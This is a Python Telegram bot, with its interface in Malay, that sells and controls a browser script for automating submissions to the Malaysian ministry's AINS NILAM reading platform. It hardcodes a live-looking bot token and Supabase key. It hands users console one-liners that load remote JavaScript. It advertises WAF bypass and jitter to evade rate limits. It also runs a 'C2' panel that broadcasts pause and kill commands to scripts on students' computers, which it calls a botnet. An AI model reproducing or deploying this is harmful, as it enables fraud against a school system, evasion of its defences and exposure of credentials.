import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import json
import subprocess
import os
import urllib.request
import urllib.error
import time
import datetime
import math

# Konfigurasi Utama
TOKEN = '8298046313:AAHqwkuWkTbxSFSZB7DO4fNrfT1hBkMWKVs'
OWNER_ID = 8402309532
bot = telebot.TeleBot(TOKEN)

# Konfigurasi Supabase
SUPA_URL = 'https://yzjsmtxhpdlsniqpcuoa.supabase.co/rest/v1/nilam_used_books'
SUPA_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl6anNtdHhocGRsc25pcXBjdW9hIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ5Mzk2ODQsImV4cCI6MjA4MDUxNTY4NH0.jMq8BwvYlODSWiFv7ysM7KiDCjzviMEJFdn1Vfst3mw'

START_TIME = time.time()
DB_FILE = 'bot_users_db.json'

# --- DATABASE PENGGUNA (SaaS) ---
def load_users():
    if not os.path.exists(DB_FILE):
        return {}
    try:
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_users(users):
    with open(DB_FILE, 'w') as f:
        json.dump(users, f, indent=4)

def get_user_plan(user_id):
    users = load_users()
    uid = str(user_id)
    if uid not in users:
        users[uid] = {"plan": "free", "joined": time.time()}
        save_users(users)
    if user_id == OWNER_ID:
        return "owner"
    return users[uid].get("plan", "free")

# --- FUNGSI UTILITI ---
def get_used_books_count():
    try:
        req = urllib.request.Request(f"{SUPA_URL}?select=title", headers={'apikey': SUPA_KEY, 'Authorization': f'Bearer {SUPA_KEY}'})
        with urllib.request.urlopen(req) as response:
            data = json.loads(response.read().decode('utf-8'))
            return len([x for x in data if not x['title'].startswith('__TEL__|')])
    except: return 0

def get_live_users():
    try:
        req = urllib.request.Request(f"{SUPA_URL}?title=like.__TEL__|*", headers={'apikey': SUPA_KEY, 'Authorization': f'Bearer {SUPA_KEY}'})
        with urllib.request.urlopen(req) as response:
            data = json.loads(response.read().decode('utf-8'))
        
        now = int(time.time() * 1000)
        active = []
        for row in data:
            p = row['title'].split('|')
            if len(p) >= 7:
                uid, ts, ok, fail, tgt, status = p[1], int(p[2]), p[3], p[4], p[5], p[6]
                idle_sec = (now-ts)//1000
                if idle_sec < 300: # 5 mins
                    active.append({
                        "uid": uid, "ok": int(ok), "tgt": int(tgt), "fail": int(fail), "status": status, "idle": idle_sec
                    })
        return active
    except: return []

def generate_progress_bar(percent, length=15):
    filled = math.floor(length * (percent / 100))
    empty = length - filled
    return "█" * filled + "░" * empty

# --- MENU UI ---
def get_main_menu(user_id):
    plan = get_user_plan(user_id)
    markup = InlineKeyboardMarkup(row_width=2)
    
    markup.add(
        InlineKeyboardButton("📊 Analitik & Metrik", callback_data="menu_analytics"),
        InlineKeyboardButton("⚙️ Automasi & Skrip", callback_data="menu_actions")
    )
    
    if plan == "free":
        markup.add(InlineKeyboardButton("💎 Naik Taraf (Upgrade PRO)", callback_data="cmd_upgrade"))
    
    # Hanya Owner boleh akses Database & Sistem
    if plan == "owner":
        markup.add(
            InlineKeyboardButton("👑 Panel Admin", callback_data="cmd_admin"),
            InlineKeyboardButton("📚 Pangkalan Data", callback_data="menu_db")
        )
        markup.add(
            InlineKeyboardButton("🖥️ Diagnostik Sistem", callback_data="menu_system"),
            InlineKeyboardButton("📡 C2 Command Center", callback_data="menu_c2")
        )
        
    markup.add(InlineKeyboardButton("❓ Panduan Pusat Kawalan", callback_data="cmd_help"))
    return markup

def get_analytics_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("📈 Laporan Keseluruhan", callback_data="cmd_stats"),
        InlineKeyboardButton("📡 Telemetri Pelajar (Live)", callback_data="cmd_live")
    )
    markup.add(InlineKeyboardButton("🏆 Carta Pendahulu", callback_data="cmd_leaderboard"))
    markup.add(InlineKeyboardButton("🔙 Kembali ke Utama", callback_data="cmd_main"))
    return markup

def get_actions_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("💉 Dapatkan Skrip", callback_data="cmd_script"),
        InlineKeyboardButton("⚡ Tetapan Jitter", callback_data="cmd_speed")
    )
    markup.add(InlineKeyboardButton("🔙 Kembali ke Utama", callback_data="cmd_main"))
    return markup

def get_c2_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("⏸️ Pause Semua", callback_data="c2_pause"),
        InlineKeyboardButton("▶️ Resume Semua", callback_data="c2_resume")
    )
    markup.add(
        InlineKeyboardButton("🛑 KILL SWITCH", callback_data="c2_kill"),
        InlineKeyboardButton("📢 Broadcast Mesej", callback_data="c2_msg")
    )
    markup.add(InlineKeyboardButton("🔙 Kembali ke Utama", callback_data="cmd_main"))
    return markup

def get_db_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🔄 Tarik Buku", callback_data="cmd_fetch"),
        InlineKeyboardButton("🗑️ Format", callback_data="cmd_reset_confirm")
    )
    markup.add(InlineKeyboardButton("🔙 Kembali", callback_data="cmd_main"))
    return markup

def get_system_menu():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("🌐 Ping AINS", callback_data="cmd_ping"),
        InlineKeyboardButton("🔙 Kembali", callback_data="cmd_main")
    )
    return markup

@bot.message_handler(commands=['addpro'])
def add_pro_user(message):
    user_id = message.chat.id
    if get_user_plan(user_id) != "owner":
        bot.reply_to(message, "⛔ Akses Ditolak! Ciri ini khas untuk Pemilik (Owner) sahaja.")
        return
        
    try:
        target_id = message.text.split(' ')[1]
        users = load_users()
        if target_id not in users:
            users[target_id] = {"plan": "pro", "joined": time.time()}
        else:
            users[target_id]["plan"] = "pro"
        save_users(users)
        bot.reply_to(message, f"✅ Berjaya! ID pengguna `{target_id}` telah dinaik taraf ke pelan *PRO*.", parse_mode="Markdown")
    except IndexError:
        bot.reply_to(message, "⚠️ Format salah. Sila guna:\n`/addpro <user_id>`", parse_mode="Markdown")

@bot.message_handler(commands=['removepro'])
def remove_pro_user(message):
    user_id = message.chat.id
    if get_user_plan(user_id) != "owner":
        bot.reply_to(message, "⛔ Akses Ditolak! Ciri ini khas untuk Pemilik (Owner) sahaja.")
        return
        
    try:
        target_id = message.text.split(' ')[1]
        users = load_users()
        if target_id in users:
            users[target_id]["plan"] = "free"
            save_users(users)
            bot.reply_to(message, f"✅ Berjaya! ID pengguna `{target_id}` telah diturunkan taraf ke pelan *FREE*.", parse_mode="Markdown")
        else:
            bot.reply_to(message, f"⚠️ Pengguna `{target_id}` tidak dijumpai dalam sistem.", parse_mode="Markdown")
    except IndexError:
        bot.reply_to(message, "⚠️ Format salah. Sila guna:\n`/removepro <user_id>`", parse_mode="Markdown")

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    user_id = message.chat.id
    plan = get_user_plan(user_id)
    plan_badge = "👑 OWNER" if plan == "owner" else ("💎 PRO" if plan == "pro" else "🆓 FREE")
    
    text = (
        f"🔥 *NILAM COMMAND CENTER PRO* [{plan_badge}]\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "Status: 🟢 *ONLINE*\n"
        "Sistem Pengurusan Automasi AINS Termaju (Mod Menu Edition).\n\n"
        "Sila pilih modul operasi:"
    )
    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=get_main_menu(user_id))

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    msg_id = call.message.message_id
    user_id = call.from_user.id
    plan = get_user_plan(user_id)
    plan_badge = "👑 OWNER" if plan == "owner" else ("💎 PRO" if plan == "pro" else "🆓 FREE")
    
    # RBAC Guard
    owner_only_cmds = ["menu_db", "menu_system", "menu_c2", "cmd_fetch", "cmd_reset_confirm", "cmd_reset_execute", "cmd_ping", "cmd_admin", "c2_pause", "c2_resume", "c2_kill", "c2_msg"]
    if call.data in owner_only_cmds and plan != "owner":
        bot.answer_callback_query(call.id, "⛔ Akses Ditolak! Ciri ini khas untuk Pemilik (Owner) sahaja.", show_alert=True)
        return

    if call.data == "cmd_main":
        text = (
            f"🔥 *NILAM COMMAND CENTER PRO* [{plan_badge}]\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Status: 🟢 *ONLINE*\n"
            "Sistem Pengurusan Automasi AINS Termaju (Mod Menu Edition).\n\n"
            "Sila pilih modul operasi:"
        )
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=get_main_menu(user_id))

    elif call.data == "menu_analytics":
        text = "📊 *MODUL ANALITIK & METRIK*\n\nPantau keseluruhan metrik prestasi sistem, bacaan telemetri pelajar, dan carta kelajuan."
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=get_analytics_menu())

    elif call.data == "menu_actions":
        text = "⚙️ *MODUL AUTOMASI & SKRIP*\n\nDapatkan skrip suntikan terkini mengikut pelan langganan anda."
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=get_actions_menu())

    elif call.data == "menu_c2":
        text = (
            "📡 *C2 COMMAND CENTER*\n\n"
            "Hantar isyarat (signal) terus kepada skrip yang sedang aktif di komputer pelajar.\n\n"
            "⚠️ *Amaran:* Arahan ini berkuatkuasa secara *Global* kepada semua pengguna."
        )
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=get_c2_menu())

    elif call.data.startswith("c2_"):
        action = call.data.split('_')[1].upper()
        bot.answer_callback_query(call.id, f"Menghantar isyarat {action}...")
        try:
            if action == 'MSG':
                payload = "__CMD__|MSG|Kemas kini pelayan AINS dikesan. Sila rehat sementara waktu."
            else:
                payload = f"__CMD__|{action}"
            
            req = urllib.request.Request(f"{SUPA_URL}?title=like.__CMD__|*", method='DELETE', headers={'apikey': SUPA_KEY, 'Authorization': f'Bearer {SUPA_KEY}'})
            urllib.request.urlopen(req)
            
            req = urllib.request.Request(SUPA_URL, method='POST', headers={'apikey': SUPA_KEY, 'Authorization': f'Bearer {SUPA_KEY}', 'Content-Type': 'application/json'}, data=json.dumps({"title": payload}).encode('utf-8'))
            urllib.request.urlopen(req)
            
            text = f"✅ *ISYARAT DIHANTAR*\n\nBerjaya memancarkan arahan *{action}* kepada seluruh rangkaian botnet."
        except Exception as e:
            text = f"❌ *GAGAL MENGHANTAR ISYARAT*\n\n`{str(e)}`"
        
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Kembali ke C2", callback_data="menu_c2"))
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "menu_db":
        bot.edit_message_text("📚 *PANGKALAN DATA*\n\nUrus perpustakaan dan Supabase.", chat_id, msg_id, parse_mode="Markdown", reply_markup=get_db_menu())

    elif call.data == "menu_system":
        bot.edit_message_text("🖥️ *MODUL DIAGNOSTIK*\n\nPeriksa kesihatan server AINS.", chat_id, msg_id, parse_mode="Markdown", reply_markup=get_system_menu())

    elif call.data == "cmd_stats":
        bot.answer_callback_query(call.id, "Menjana laporan prestasi...")
        try:
            with open('/root/NilamAutomationTools/books_library.json', 'r', encoding='utf-8') as f: 
                books = json.load(f)
            total = len(books)
            used = get_used_books_count()
            left = max(0, total - used)
            percent = (used / total) * 100 if total > 0 else 0
            bar = generate_progress_bar(percent)
            
            active_users = len(get_live_users())
            
            text = (
                "📊 *STATISTIK PELAJAR*\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📦 *Total Buku :* `{total:,}`\n"
                f"✅ *Selesai    :* `{used:,}`\n"
                f"⏳ *Baki       :* `{left:,}`\n\n"
                f"`[{bar}] {percent:.1f}%`\n\n"
                f"👥 *Pelajar Aktif:* `{active_users}` online\n\n"
                "⚙️ *Mod Enjin Aktif:*\n"
                "• 👻 Ghost Mode (Anti-FP)\n"
                "• 🧠 AI Smart Review\n"
                "• ⚡ Jitter + URL Spoof"
            )
            markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔄 Segarkan Data", callback_data="cmd_stats"), InlineKeyboardButton("🔙 Kembali", callback_data="menu_analytics"))
            bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=markup)
        except Exception as e:
            bot.answer_callback_query(call.id, "Ralat membaca data", show_alert=True)

    elif call.data == "cmd_live":
        bot.answer_callback_query(call.id)
        users = get_live_users()
        text = "📡 *TELEMETRI PELAJAR (LIVE)*\n━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        if not users:
            text += "💤 *Tiada isyarat dikesan.*\nPastikan skrip sedang berjalan."
        else:
            for u in users:
                p_ok, p_tgt = u['ok'], u['tgt']
                prog_pct = (p_ok / p_tgt * 100) if p_tgt > 0 else 0
                prog_bar = generate_progress_bar(prog_pct, 10)
                text += (
                    f"👤 *ID Pelajar:* `{u['uid']}`\n"
                    f"📈 *Progres:* {p_ok}/{p_tgt} ({prog_pct:.0f}%)\n"
                    f"`[{prog_bar}]`\n"
                    f"⚠️ *Gagal:* {u['fail']} | ⏱️ *Status:* _{u['status']}_\n"
                    f"📡 *Isyarat Terakhir:* {u['idle']} saat lalu\n\n"
                )
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔄 Segarkan", callback_data="cmd_live"), InlineKeyboardButton("🔙 Kembali", callback_data="menu_analytics"))
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=markup)
        
    elif call.data == "cmd_leaderboard":
        bot.answer_callback_query(call.id, "Menyusun carta pendahulu...")
        users = get_live_users()
        users.sort(key=lambda x: x['ok'], reverse=True)
        
        text = "🏆 *CARTA PENDAHULU (TOP PELAJAR AKTIF)*\n━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        if not users:
            text += "💤 Belum ada data pengguna yang mencukupi untuk dipaparkan."
        else:
            medals = ["🥇", "🥈", "🥉", "🎖️", "🎖️"]
            for i, u in enumerate(users[:5]):
                medal = medals[i] if i < len(medals) else "🏅"
                text += f"{medal} *{u['uid']}*\n└ Berjaya hantar: *{u['ok']} buku*\n\n"
                
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Kembali", callback_data="menu_analytics"))
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "cmd_script":
        bot.answer_callback_query(call.id)
        if plan == "free":
            text = (
                "💻 *SKRIP AUTOMASI (VERSI FREE)*\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "Anda menggunakan pelan 🆓 *FREE*. Skrip ini mempunyai kelajuan asas dan terdedah kepada sekatan WAF (Ralat 429).\n\n"
                "*Salin kod di bawah ke Console:*\n"
                "`var s=document.createElement('script');s.src='https://raw.githubusercontent.com/Notfoundst12/Nilam/main/n_free.js?v='+Date.now();document.head.appendChild(s);`\n\n"
                "⚠️ *Had Versi Percuma:*\n"
                "❌ Tiada WAF Bypass\n"
                "❌ Tiada Auto-Sleep\n"
                "❌ Jitter Rawak Ditutup\n\n"
                "_Naik taraf ke PRO untuk menikmati ciri Stealth dan elak sekatan pelayan!_"
            )
            markup = InlineKeyboardMarkup().add(InlineKeyboardButton("💎 Naik Taraf PRO", callback_data="cmd_upgrade"), InlineKeyboardButton("🔙 Kembali", callback_data="menu_actions"))
        else:
            text = (
                "💻 *SKRIP MOD MENU v11.0 [PRO]*\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "Antaramuka baharu dengan ciri *Mod Menu* terapung. Kawal kelajuan dan ciri perlindungan secara terus dari browser.\n\n"
                "Salin kod di bawah ke Console:\n\n"
                "`var s=document.createElement('script');s.src='https://raw.githubusercontent.com/Notfoundst12/Nilam/main/n.js?v='+Date.now();document.head.appendChild(s);`"
            )
            markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Kembali", callback_data="menu_actions"))
            
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=markup)
        
    elif call.data == "cmd_speed":
        bot.answer_callback_query(call.id)
        text = (
            "⚡ *TETAPAN KELAJUAN (JITTER)*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "*Info Sistem:* Skrip v11.0 menggunakan sistem *Dynamic Jitter Delay* untuk meniru kelakuan manusia dan mengelakkan Firewall AINS (Ralat 429).\n\n"
            "*Formula Pergerakan Masa:*\n"
            "`Delay = (Asas * Pendarab) + Rawak(500ms - 1500ms)`\n\n"
            "_Sistem menetapkan kawalan ini secara dinamik dalam skrip web. Anda boleh menukar Delay Asas (Default: 600ms) melalui fungsi Slider pada Panel Mod Menu di browser._"
        )
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Kembali", callback_data="menu_actions"))
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "cmd_upgrade":
        bot.answer_callback_query(call.id)
        text = (
            "💎 *PELAN NAIK TARAF KE PRO (VIP)*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "_\"Kenapa buang masa 5 jam mengklik borang, jika bot boleh menyiapkannya dalam masa 5 minit?\"_\n\n"
            "Versi FREE direka untuk gagal. Pelayan akan mengesan anda dan menyekat IP anda (Ralat 429). Lindungi diri anda dan jimat masa dengan *Pelan PRO*.\n\n"
            "🔥 *CIRI-CIRI EKSKLUSIF PRO:*\n"
            "✅ *Tiada Had Buku* (Jalan 100+ buku tanpa henti)\n"
            "✅ *WAF Bypass Asing* (Gagal dikesan oleh Firewall AINS)\n"
            "✅ *Smart Jitter* (Meniru corak klik manusia sebenar)\n"
            "✅ *Auto-Sleep Engine* (Tidur bila disyaki, bangun bila selamat)\n"
            "✅ *Sokongan Premium* (Kemaskini patch selagi AINS wujud)\n\n"
            "💰 *HARGA LELONGAN KHAS HARI INI:*\n"
            "~RM 50.00 / bulan~\n"
            "🔥 *RM 15.00 / Seumur Hidup! (Bayar Sekali Sahaja)*\n\n"
            "_(Terhad kepada 10 pembeli pertama minggu ini. Selepas ini harga kembali normal)_"
        )
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("💳 Beli Sekarang (Direct Owner)", url="tg://user?id=8402309532"))
        markup.add(InlineKeyboardButton("🔙 Kembali ke Menu", callback_data="cmd_main"))
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "cmd_admin":
        users = load_users()
        total_users = len(users)
        pro_users = len([u for u, d in users.items() if d.get('plan') == 'pro'])
        text = (
            "👑 *PANEL ADMIN (OWNER SAHAJA)*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Pusat kawalan pangkalan data pengguna bot.\n\n"
            f"👥 *Jumlah Pengguna Bot:* {total_users}\n"
            f"💎 *Pengguna PRO:* {pro_users}\n"
            f"🆓 *Pengguna FREE:* {total_users - pro_users}\n\n"
            "_Sistem langganan (SaaS) sedang aktif._"
        )
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Kembali", callback_data="cmd_main"))
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "cmd_fetch":
        bot.answer_callback_query(call.id, "Scraping buku dari perpustakaan...")
        subprocess.Popen(["python3", "/root/NilamAutomationTools/fetch_books3.py"])
        text = "🔄 *PENGUMPULAN DATA API*\n\nScraper sedang berjalan di latar belakang. Sila semak Dashboard nanti."
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙", callback_data="menu_db")))

    elif call.data == "cmd_reset_confirm":
        text = (
            "⚠️ *PENGESAHAN RESET DATABASE*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "*AMARAN KRITIKAL!* Padam semua rekod Supabase?"
        )
        markup = InlineKeyboardMarkup(row_width=2).add(InlineKeyboardButton("❌ BATALKAN", callback_data="menu_db"), InlineKeyboardButton("🚨 YA, PADAM!", callback_data="cmd_reset_execute"))
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "cmd_reset_execute":
        bot.answer_callback_query(call.id, "Memformat data awan...")
        try:
            req = urllib.request.Request(f"{SUPA_URL}?title=not.eq.random_string", method='DELETE', headers={'apikey': SUPA_KEY, 'Authorization': f'Bearer {SUPA_KEY}'})
            urllib.request.urlopen(req)
            text = "✅ *DATABASE BERJAYA DIFORMAT*"
        except Exception as e:
            text = f"❌ *RALAT PENGHAPUSAN*\n\n`{str(e)}`"
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Kembali", callback_data="menu_db")))

    elif call.data == "cmd_ping":
        bot.answer_callback_query(call.id, "Ping...")
        try:
            start = time.time()
            res = urllib.request.urlopen("https://ains-api.moe.gov.my", timeout=5)
            ms = int((time.time() - start) * 1000)
            status = "🟢 ONLINE" if res.status == 200 else f"🟡 HTTP {res.status}"
        except urllib.error.HTTPError as e:
            ms = int((time.time() - start) * 1000)
            if e.code in [401, 403, 404, 405, 429]: status = f"🟢 ONLINE (HTTP {e.code})"
            else: status = f"🔴 ERROR (HTTP {e.code})"
        except:
            ms, status = "N/A", "🔴 OFFLINE"

        text = (
            "🖥️ *DIAGNOSTIK KESIHATAN SISTEM*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📡 *PELAYAN AINS (MOE):*\n"
            f"*Status:* {status}\n*Latensi:* `{ms} ms`"
        )
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔄 Ping Semula", callback_data="cmd_ping"), InlineKeyboardButton("🔙 Kembali", callback_data="menu_system"))
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "cmd_help":
        text = "❓ *PANDUAN*\n\nPlatform SaaS Automasi NILAM.\nHubungi admin untuk naik taraf ke PRO."
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Kembali", callback_data="cmd_main")))

if __name__ == "__main__":
    print("Bot Command Center SaaS Edition sedang berjalan...")
    bot.polling(none_stop=True, timeout=60)
